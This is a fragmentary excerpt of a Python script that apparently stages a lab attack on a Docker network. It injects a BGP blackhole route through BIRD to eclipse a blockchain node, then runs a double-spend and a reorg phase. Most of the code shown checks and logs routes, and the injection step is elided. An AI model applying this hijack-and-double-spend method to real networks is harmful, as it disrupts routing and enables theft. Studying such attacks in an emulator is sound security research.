...
Attack mechanism:
  ...
  10.162.0.71/32 to bird.conf and reload — causing AS160 to route all traffic
  destined for the victim through AS161, where it is dropped. No ARP spoofing,
  no iptables — pure L3 routing manipulation via BGP UPDATE.
...
def inject_bgp_hijack():
    ...
    # Escape the block for sh -c echo — use tee to append safely
...
def get_route_for_victim():
    """
    Ask AS160's border router how it routes to the victim IP.
    Returns the output of 'ip route get 10.162.0.71'.
    """
    # Find the AS160 border router container name
    r = subprocess.run(
        ["docker", "ps", "--format", "{{.Names}}"],
        capture_output=True, text=True
    )
    brd160 = next(
        (n for n in r.stdout.splitlines() if "as160brd" in n or "as160" in n and "brd" in n),
        None
    )
    if not brd160:
        return "(could not find AS160 border router container)"
    return docker_exec(brd160, f"ip route get {VICTIM_IP}", check=False)
...
def phase0_preflight():
    ...
    if peers == 0:
        log_warn("Node 162 already has 0 peers — check network connectivity")
    else:
...
def phase1_bgp_eclipse():
    ...
    # Poll AS160's border router: the route to victim should now go via AS161
    log_info("Waiting for poisoned route to propagate to AS160 ...")
    def route_hijacked():
        route_out = get_route_for_victim()
        log(f"  AS160 route to {VICTIM_IP}: {route_out.strip()}", DIM)
    ...
    result = wait_for(route_hijacked, timeout=60, label="BGP route propagated to AS160")
    if not result:
        log_warn("Could not confirm route propagation via AS160 router — verifying via peer count instead")
    else:
        log_ok("BGP route confirmed: AS160 is now routing victim traffic through AS161 (blackhole)")
...
def phase2_double_spend(w3_160, w3_162):
    ...
    # Node 162 miner may have stalled — verify and restart if needed
...
def phase3_reorg(w3_160, w3_162, real_block_at_p2, fake_block_at_p2):
    ...
    # Verify AS160 route returns to normal
    log_info("Waiting for AS160 route to victim to recover ...")
    def route_restored():
        route_out = get_route_for_victim()
        log(f"  AS160 route to {VICTIM_IP}: {route_out.strip()}", DIM)
        # Route should now go via AS162's address, not AS161's IX address
        return "10.103.0.161" not in route_out
    result = wait_for(route_restored, timeout=60, label="BGP route restored")
    if not result:
        log_warn("AS160 route may not have restored yet — BGP convergence can take time")
    else:
        log_ok("BGP route restored — traffic to victim now flows normally again")

    # Node 162 should reconnect automatically once routing recovers.
    ...
    log_info("Pushing addPeer to Node 162 via JSON-RPC ...")
    try:
        body = _json.dumps({
...
def main():
    ...
    print(f"  {DIM}Method:   BGP blackhole route  10.162.0.71/32 via BIRD{RESET}\n")
